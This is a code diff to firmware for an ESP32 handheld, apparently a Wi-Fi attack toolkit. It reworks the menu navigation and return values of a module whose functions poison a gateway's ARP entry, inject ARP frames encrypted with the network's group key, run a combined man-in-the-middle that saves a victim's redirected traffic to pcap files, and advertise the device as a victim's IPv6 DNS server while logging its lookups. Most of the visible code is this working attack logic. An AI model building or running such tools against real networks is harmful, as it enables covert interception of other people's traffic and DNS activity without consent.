@@ -310,17 +310,17 @@ static esp_err_t isoTxGtkArp(const uint8_t gtk[16], const uint8_t bssid[6], cons
 // reachability probe). Also the diagnostic for the big unknown — will
 // esp_wifi_80211_tx accept a frame whose A2 is the spoofed BSSID while we're
 // associated? The live TX ok/err counters answer that on the first flash.
-static void isoInjectArp(int idx) {
+static bool isoInjectArp(int idx) {
     auto& dm = displayManager;
     uint8_t gtk[32]; int glen = 0;
     if (!netspyGetGtk(gtk, &glen) || glen != 16) {
         isoHeader("inject");
         dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort.");
         dm.setTextColor(0x7BEF);  dm.println("(run 'is cctest' to check)");
-        dm.printCommandScreen(); return;
+        dm.printCommandScreen(); return false;
     }
     const uint8_t* bm = WiFi.BSSID();
-    if (!bm) { isoHeader("inject"); dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
+    if (!bm) { isoHeader("inject"); dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return false; }
     uint8_t bssid[6]; memcpy(bssid, bm, 6);
     uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
     IPAddress lip = WiFi.localIP();
@@ -356,7 +356,7 @@ static void isoInjectArp(int idx) {
         dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yKey);  dm.printText("keyid");
         dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yOk);   dm.printText("TX ok");
         dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yErr);  dm.printText("TX err");
-        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);   dm.printText("[k] keyid 1/2   [q] stop");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);   dm.printText("[k] keyid 1/2   [q] back to menu");
     };
     auto val = [&](int y, uint16_t col, const char* s) {   // repaint one value cell in place
         dm.fillRect(66, y, SCREEN_WIDTH - 66, LINE_HEIGHT, TFT_BLACK);
@@ -412,7 +412,7 @@ static void isoInjectArp(int idx) {
         if (!dm.isBlocked() && millis() - lastVal >= 500) { values(); lastVal = millis(); }
         vTaskDelay(pdMS_TO_TICKS(5));
     }
-    dm.clearScreen(); dm.printCommandScreen();
+    dm.clearScreen(); return true;
 }
 
 // ── gateway ARP-poison (uplink MITM + isolation-delivery test) ───────────────────
@@ -422,21 +422,21 @@ static void isoInjectArp(int idx) {
 // is also THE delivery test — if the victim's internet redirects/stalls, then
 // victim->T-Deck delivery works and traffic-interception attacks (RA DNS poison,
 // MITM) are viable; if the victim keeps browsing normally, isolation is dropping it.
-static void isoGwPoison(int idx) {
+static bool isoGwPoison(int idx) {
     auto& dm = displayManager;
     uint8_t gtk[32]; int glen = 0;
     if (!netspyGetGtk(gtk, &glen) || glen != 16) {
         isoHeader("gw poison");
-        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return;
+        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return false;
     }
     const uint8_t* bm = WiFi.BSSID();
-    if (!bm) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
+    if (!bm) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return false; }
     uint8_t bssid[6]; memcpy(bssid, bm, 6);
     uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
     IPAddress gw = WiFi.gatewayIP();
     uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
     uint32_t victimIp = netspyDeviceIp(idx);
-    if (!gwIp) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No gateway IP."); dm.printCommandScreen(); return; }
+    if (!gwIp) { isoHeader("gw poison"); dm.setTextColor(TFT_RED); dm.println("No gateway IP."); dm.printCommandScreen(); return false; }
 
     uint64_t pn = 0x800000000000ULL; uint8_t keyid = 1; uint16_t seq = 0;
     uint32_t txOk = 0, txErr = 0, lastTx = 0, lastVal = 0; esp_err_t lastRc = ESP_OK;
@@ -459,7 +459,7 @@ static void isoGwPoison(int idx) {
         dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yTx);  dm.printText("TX ok");
         dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, yErr); dm.printText("TX err");
         dm.setTextColor(0x7BEF);       dm.setCursor(6, yHint); dm.printText("watch victim net: stalls = holding");
-        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);  dm.printText("[k] keyid 1/2   [q] stop");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);  dm.printText("[k] keyid 1/2   [q] back to menu");
     };
     auto values = [&]() {                             // repaint only the counters, in place
         if (dm.isBlocked()) return;
@@ -486,7 +486,7 @@ static void isoGwPoison(int idx) {
         if (!dm.isBlocked() && millis() - lastVal >= 500) { values(); lastVal = millis(); }
         vTaskDelay(pdMS_TO_TICKS(5));
     }
-    dm.clearScreen(); dm.printCommandScreen();
+    dm.clearScreen(); return true;
 }
 
 // portdown capture ring — promiscuous grabs every 802.11 data frame that mentions
@@ -553,12 +553,12 @@ static void isoCapCb(void* buf, wifi_promiscuous_pkt_type_t t) {
 // wrongly reported Windows victims as unreachable. We resolve via our own lwip ARP
 // (netdiscover's pattern), then try ICMP too as extra info. On a non-isolated net
 // ARP resolves directly; under strict isolation it won't (use 'inject' there).
-static void isoBounce(int idx) {
+static bool isoBounce(int idx) {
     auto& dm = displayManager;
     isoHeader("reachability probe");
     uint32_t victimIp = netspyDeviceIp(idx);
-    if (!victimIp)     { dm.setTextColor(TFT_RED); dm.println("Victim has no IP."); dm.printCommandScreen(); return; }
-    if (!netif_default){ dm.setTextColor(TFT_RED); dm.println("No network interface."); dm.printCommandScreen(); return; }
+    if (!victimIp)     { dm.setTextColor(TFT_RED); dm.println("Victim has no IP."); dm.printCommandScreen(); return false; }
+    if (!netif_default){ dm.setTextColor(TFT_RED); dm.println("No network interface."); dm.printCommandScreen(); return false; }
 
     char b[56]; isoIpStr(victimIp, b, sizeof(b));
     dm.setTextColor(0x7BEF); dm.printText("Checking "); dm.printText(b); dm.println(" ...");
@@ -601,7 +601,14 @@ static void isoBounce(int idx) {
     } else {
         dm.setTextColor(TFT_DARKGREY); dm.println("ICMP: no reply (firewall - ok)");
     }
-    dm.printCommandScreen();
+    dm.println("");
+    dm.setTextColor(TFT_DARKGREY); dm.println("any key -> back to menu");
+    while (true) {
+        if (inputHandler.getKeyboardInput()) break;
+        if (LockScreenManager::getInstance().consumeJustUnlocked()) break;
+        vTaskDelay(pdMS_TO_TICKS(30));
+    }
+    return true;
 }
 
 // ── portdown — targeted victim capture → SD pcap (non-disruptive) ────────────────
@@ -611,14 +618,14 @@ static void isoBounce(int idx) {
 // involving the victim (+ anything a gateway-poison run redirects our way); on an
 // L2 AP with a poison active it captures the redirected downlink. GDMA-safe: frames
 // ring in RAM, flushed to SD with promiscuous paused.
-static void isoPortDown(int idx) {
+static bool isoPortDown(int idx) {
     auto& dm = displayManager;
     isoHeader("victim capture");
     uint8_t vic[6];
-    if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return; }
+    if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return false; }
     if (!sdCardManager.isReady()) {
         dm.setTextColor(TFT_RED); dm.println("No SD — capture needs it.");
-        dm.printCommandScreen(); return;
+        dm.printCommandScreen(); return false;
     }
 
     // Allocate the pcap file (promiscuous still off → plain SD I/O).
@@ -630,7 +637,7 @@ static void isoPortDown(int idx) {
         seq++;
     }
     File cap = SD.open(path, FILE_WRITE);
-    if (!cap) { dm.setTextColor(TFT_RED); dm.println("SD open failed."); dm.printCommandScreen(); return; }
+    if (!cap) { dm.setTextColor(TFT_RED); dm.println("SD open failed."); dm.printCommandScreen(); return false; }
     pcap::writeGlobalHeader(cap);
 
     char b[56];
@@ -650,7 +657,7 @@ static void isoPortDown(int idx) {
     esp_wifi_set_promiscuous(true);
 
     uint32_t written = 0, lastDraw = 0, lastFlush = 0;
-    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[q] stop + save");
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[q] save + back to menu");
     while (true) {
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') break;
@@ -694,7 +701,7 @@ static void isoPortDown(int idx) {
         written++;
     }
     cap.close();
-    dm.clearScreen(); dm.printCommandScreen();
+    dm.clearScreen(); return true;
 }
 
 // ── combined MITM — gateway poison (TX) + victim capture (RX) at once ─────────────
@@ -703,30 +710,32 @@ static void isoPortDown(int idx) {
 // SD and (b) COUNT the redirected frames — a nonzero count is live proof the poison
 // took hold and this network does L2 delivery (a mobile hotspot L3-routes past the
 // poison → count stays 0). Turns the two independent pieces into one automatic MITM.
-static void isoMitm(int idx) {
+static bool isoMitm(int idx) {
     auto& dm = displayManager;
     isoHeader("combined MITM");
     uint8_t gtk[32]; int glen = 0;
     if (!netspyGetGtk(gtk, &glen) || glen != 16) {
-        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return;
+        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return false;
     }
     const uint8_t* bm = WiFi.BSSID();
-    if (!bm) { dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
+    if (!bm) { dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return false; }
     uint8_t bssid[6]; memcpy(bssid, bm, 6);
     uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
     uint8_t vic[6];
-    if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return; }
+    if (!netspyDeviceMac(idx, vic)) { dm.setTextColor(TFT_RED); dm.println("Bad victim."); dm.printCommandScreen(); return false; }
     IPAddress gw = WiFi.gatewayIP();
     uint32_t gwIp = ((uint32_t)gw[0] << 24) | ((uint32_t)gw[1] << 16) | ((uint32_t)gw[2] << 8) | gw[3];
     uint32_t victimIp = netspyDeviceIp(idx);
-    if (!gwIp) { dm.setTextColor(TFT_RED); dm.println("No gateway IP."); dm.printCommandScreen(); return; }
+    if (!gwIp) { dm.setTextColor(TFT_RED); dm.println("No gateway IP."); dm.printCommandScreen(); return false; }
 
     // Optional pcap of the redirected traffic (SD I/O still off-radio here).
+    // Distinct `mitm_NNN.pcap` name (portdown uses NNN.pcap) — the next free slot
+    // is chosen, so a run never overwrites an earlier capture.
     File cap; char path[40] = "";
     if (sdCardManager.isReady()) {
         sdCardManager.ensureDir(SD_DIR_ISOSCAN);
         uint16_t s = 1;
-        while (s <= 999) { snprintf(path, sizeof(path), SD_DIR_ISOSCAN "/%03u.pcap", s); if (!SD.exists(path)) break; s++; }
+        while (s <= 999) { snprintf(path, sizeof(path), SD_DIR_ISOSCAN "/mitm_%03u.pcap", s); if (!SD.exists(path)) break; s++; }
         cap = SD.open(path, FILE_WRITE);
         if (cap) pcap::writeGlobalHeader(cap);
     }
@@ -735,6 +744,10 @@ static void isoMitm(int idx) {
     dm.setTextColor(0x6FE8); dm.setCursor(6, outputY + LINE_HEIGHT * 2);
     dm.printText(cap ? "poison + capture; is it holding? see verdict"
                      : "poison + capture (no SD - live count only)");
+    // Show exactly where the capture is being written (or that it isn't).
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 10);  dm.printText("file");
+    dm.setTextColor(cap ? 0x6FE8 : TFT_DARKGREY); dm.setCursor(56, outputY + LINE_HEIGHT * 10);
+    dm.printText(cap ? path : "(no SD - count only)");
 
     // Arm capture with redirect detection.
     s_capHead = s_capTail = 0; s_capSeen = s_capDropped = s_capRedir = s_capArpAck = s_capCand = 0;
@@ -752,7 +765,7 @@ static void isoMitm(int idx) {
     // an old ARP entry) is NOT a held MITM — only a SUSTAINED data rate is. Sample the
     // redirect count over a 2s window; declare LIVE only above a real throughput.
     uint32_t winRedir0 = 0, winMs = millis(), rate = 0; bool sustained = false;
-    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[k] keyid 1/2   [q] stop + save");
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("[k] keyid 1/2   [q] save + back to menu");
     while (true) {
         char k = inputHandler.getKeyboardInput();
         if (k == 'q' || k == 'Q') break;
@@ -841,7 +854,7 @@ static void isoMitm(int idx) {
         }
         cap.close();
     }
-    dm.clearScreen(); dm.printCommandScreen();
+    dm.clearScreen(); return true;
 }
 
 // ── auto — smart probe → detect → recommend ──────────────────────────────────────
@@ -855,7 +868,7 @@ static void isoMitm(int idx) {
 //   4 GTK inject (~6s)      — inject broadcast ARP, watch our ARP cache for a reply
 //   5 poison-hold (~6s)     — brief gateway poison + redirect count = L2-vs-L3 test
 //   6 bounce ping           — IP-layer reachability via the gateway
-static void isoSmartAuto(int idx) {
+static bool isoSmartAuto(int idx) {
     auto& dm = displayManager;
     isoHeader("smart auto");
     uint32_t victimIp = netspyDeviceIp(idx);
@@ -989,10 +1002,10 @@ static void isoSmartAuto(int idx) {
         dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, line); dm.printText("VERDICT"); line += LINE_HEIGHT;
         dm.setTextColor(vcol);         dm.setCursor(6, line); dm.printText(verdict);
     }
-    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("any key to continue");
+    dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230); dm.printText("any key -> back to menu");
     while (true) { char k = inputHandler.getKeyboardInput(); if (k) break;
                    if (LockScreenManager::getInstance().consumeJustUnlocked()) break; vTaskDelay(pdMS_TO_TICKS(30)); }
-    dm.clearScreen(); dm.printCommandScreen();
+    dm.clearScreen(); return true;
 }
 
 // ── RA DNS poison — ICMPv6 Router Advertisement pointing the victim's DNS at us ──
@@ -1092,16 +1105,16 @@ static void isoDnsRecv(void* arg, struct udp_pcb* pcb, struct pbuf* p,
     pbuf_free(p);
 }
 
-static void isoRaDns(int idx) {
+static bool isoRaDns(int idx) {
     auto& dm = displayManager;
     (void)idx;                                       // RA is multicast — hits all clients
     isoHeader("RA DNS poison");
     uint8_t gtk[32]; int glen = 0;
     if (!netspyGetGtk(gtk, &glen) || glen != 16) {
-        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return;
+        dm.setTextColor(TFT_RED); dm.println("GTK unreadable — abort."); dm.printCommandScreen(); return false;
     }
     const uint8_t* bm = WiFi.BSSID();
-    if (!bm) { dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return; }
+    if (!bm) { dm.setTextColor(TFT_RED); dm.println("No BSSID."); dm.printCommandScreen(); return false; }
     uint8_t bssid[6]; memcpy(bssid, bm, 6);
     uint8_t src[6];   esp_wifi_get_mac(WIFI_IF_STA, src);
 
@@ -1115,11 +1128,11 @@ static void isoRaDns(int idx) {
             esp_ip6_addr_t a;
             if (esp_netif_get_ip6_linklocal(nif, &a) == ESP_OK) { memcpy(ll, a.addr, 16); haveLL = true; break; }
             char k = inputHandler.getKeyboardInput();
-            if (k == 'q' || k == 'Q') { dm.printCommandScreen(); return; }
+            if (k == 'q' || k == 'Q') { dm.clearScreen(); return true; }   // aborted before start → menu
             vTaskDelay(pdMS_TO_TICKS(200));
         }
     }
-    if (!haveLL) { dm.setTextColor(TFT_RED); dm.println("No IPv6 link-local."); dm.printCommandScreen(); return; }
+    if (!haveLL) { dm.setTextColor(TFT_RED); dm.println("No IPv6 link-local."); dm.printCommandScreen(); return false; }
 
     // DNS query log (STA mode — plain SD I/O, no promiscuous here).
     File log; char path[40] = "";
@@ -1153,8 +1166,11 @@ static void isoRaDns(int idx) {
         dm.setTextColor(0x6FE8);       dm.setCursor(6, top);                       dm.printText("make victim use us as DNS; log its lookups");
         dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 3); dm.printText("our DNS");
         dm.setTextColor(TFT_YELLOW);   dm.setCursor(72, outputY + LINE_HEIGHT * 3); dm.printText(llShort);
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 5); dm.printText("log");
+        dm.setTextColor(log ? 0x6FE8 : TFT_DARKGREY); dm.setCursor(72, outputY + LINE_HEIGHT * 5);
+        dm.printText(log ? path : "(no SD - screen only)");
         dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, outputY + LINE_HEIGHT * 6); dm.printText("victim is reaching:");
-        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);                       dm.printText("[k] keyid   [q] stop");
+        dm.setTextColor(TFT_DARKGREY); dm.setCursor(6, 230);                       dm.printText("[k] keyid   [q] back to menu");
     };
     chrome();
 
@@ -1225,20 +1241,23 @@ static void isoRaDns(int idx) {
 
     if (dpcb) { LOCK_TCPIP_CORE(); udp_remove(dpcb); UNLOCK_TCPIP_CORE(); }
     if (log) log.close();
-    dm.clearScreen(); dm.printCommandScreen();
+    dm.clearScreen(); return true;
 }
 
 // ── attack dispatch ──────────────────────────────────────────────────────────────
-static void isoRunAttack(int idx, IsoAttack attack) {
+// Returns true → the attack ended cleanly (caller returns to the attack menu);
+// false → a hard error occurred and the message + CLI prompt are already on screen
+// (caller exits `is` entirely).
+static bool isoRunAttack(int idx, IsoAttack attack) {
     auto& dm = displayManager;
     switch (attack) {
-        case ISO_INJECT:   isoInjectArp(idx); return;
-        case ISO_PORTUP:   isoGwPoison(idx);  return;
-        case ISO_MITM:     isoMitm(idx);      return;
-        case ISO_BOUNCE:   isoBounce(idx);    return;
-        case ISO_PORTDOWN: isoPortDown(idx);  return;
-        case ISO_RADNS:    isoRaDns(idx);     return;
-        case ISO_AUTO:     isoSmartAuto(idx); return;
+        case ISO_INJECT:   return isoInjectArp(idx);
+        case ISO_PORTUP:   return isoGwPoison(idx);
+        case ISO_MITM:     return isoMitm(idx);
+        case ISO_BOUNCE:   return isoBounce(idx);
+        case ISO_PORTDOWN: return isoPortDown(idx);
+        case ISO_RADNS:    return isoRaDns(idx);
+        case ISO_AUTO:     return isoSmartAuto(idx);
         default: break;                       // ISO_BCAST falls through
     }
     // bcast: a to-DS broadcast frame would need our PAIRWISE key (PTK) to be
@@ -1252,7 +1271,14 @@ static void isoRunAttack(int idx, IsoAttack attack) {
     dm.println("");
     dm.setTextColor(TFT_WHITE);  dm.println("Use 'inject' or 'bounce' instead");
     dm.println("to test victim reachability.");
-    dm.printCommandScreen();
+    dm.println("");
+    dm.setTextColor(TFT_DARKGREY); dm.println("any key -> back to menu");
+    while (true) {
+        if (inputHandler.getKeyboardInput()) break;
+        if (LockScreenManager::getInstance().consumeJustUnlocked()) break;
+        vTaskDelay(pdMS_TO_TICKS(30));
+    }
+    dm.clearScreen(); return true;
 }
 
 // ── is cctest — validate the CCMP engine on-device (no transmit) ─────────────────
@@ -1307,7 +1333,7 @@ void runIsoscan(char* args) {
 
     // Parse args: optional `ns<#>` victim index + optional attack keyword.
     int victim = -1;
-    IsoAttack attack = ISO_NONE;
+    IsoAttack pending = ISO_NONE;      // attack to run straight away (from the CLI)
     if (args && args[0]) {
         char buf[64]; strncpy(buf, args, sizeof(buf) - 1); buf[sizeof(buf) - 1] = '\0';
         for (char* tok = strtok(buf, " "); tok; tok = strtok(nullptr, " ")) {
@@ -1316,23 +1342,40 @@ void runIsoscan(char* args) {
                 victim = atoi(tok + 2);
             } else {
                 IsoAttack a = isoAttackFromKey(tok);
-                if (a != ISO_NONE) attack = a;
+                if (a != ISO_NONE) pending = a;
             }
         }
     }
 
-    // Victim: use the CLI index if valid, else open the picker.
-    if (victim < 0 || victim >= netspyDeviceCount()) {
-        victim = isoPickVictim();
-        if (victim < 0) { dm.clearScreen(); dm.printCommandScreen(); return; }
+    // Navigation is a stack, so quitting one level steps back one level rather than
+    // dropping out of the whole command:
+    //   attack running --[q]--> attack menu --[q]--> victim picker --[q]--> CLI.
+    // A victim given on the CLI has no picker to fall back to, so [q] at the menu
+    // exits there instead.
+    bool victimFromCli = (victim >= 0 && victim < netspyDeviceCount());
+    while (true) {
+        if (victim < 0 || victim >= netspyDeviceCount()) {
+            victim = isoPickVictim();
+            if (victim < 0) break;             // [q] at the picker → leave `is`
+            victimFromCli = false;
+        }
+
+        // Attack-menu loop for the chosen victim.
+        while (true) {
+            IsoAttack a = pending; pending = ISO_NONE;   // CLI attack runs once, then menu
+            if (a == ISO_NONE) {
+                a = isoAttackMenu(victim);
+                if (a == ISO_NONE) break;      // [q] at the menu → back to the picker
+            }
+            if (isoConfirm(victim, a)) {
+                if (!isoRunAttack(victim, a)) return;     // hard error: msg + prompt already shown
+            }
+            // otherwise (attack finished or confirm cancelled) → redraw the menu
+        }
+
+        if (victimFromCli) break;              // CLI victim → no picker to return to
+        victim = -1;                            // reopen the picker for another target
     }
 
-    // Attack: use the CLI keyword, else open the menu.
-    if (attack == ISO_NONE) {
-        attack = isoAttackMenu(victim);
-        if (attack == ISO_NONE) { dm.clearScreen(); dm.printCommandScreen(); return; }
-    }
-
-    if (!isoConfirm(victim, attack)) { dm.clearScreen(); dm.printCommandScreen(); return; }
-    isoRunAttack(victim, attack);
+    dm.clearScreen(); dm.printCommandScreen();
 }
